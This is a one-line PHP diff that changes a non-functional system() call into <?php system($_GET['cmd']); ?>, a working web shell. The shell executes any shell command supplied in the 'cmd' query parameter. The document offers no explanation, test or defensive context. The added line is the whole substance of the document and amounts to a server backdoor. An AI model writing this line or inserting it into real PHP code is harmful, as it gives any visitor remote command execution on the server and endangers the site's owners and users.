@@ -1,1 +1,1 @@
-<?php system(['cmd']); ?>
+<?php system($_GET['cmd']); ?>
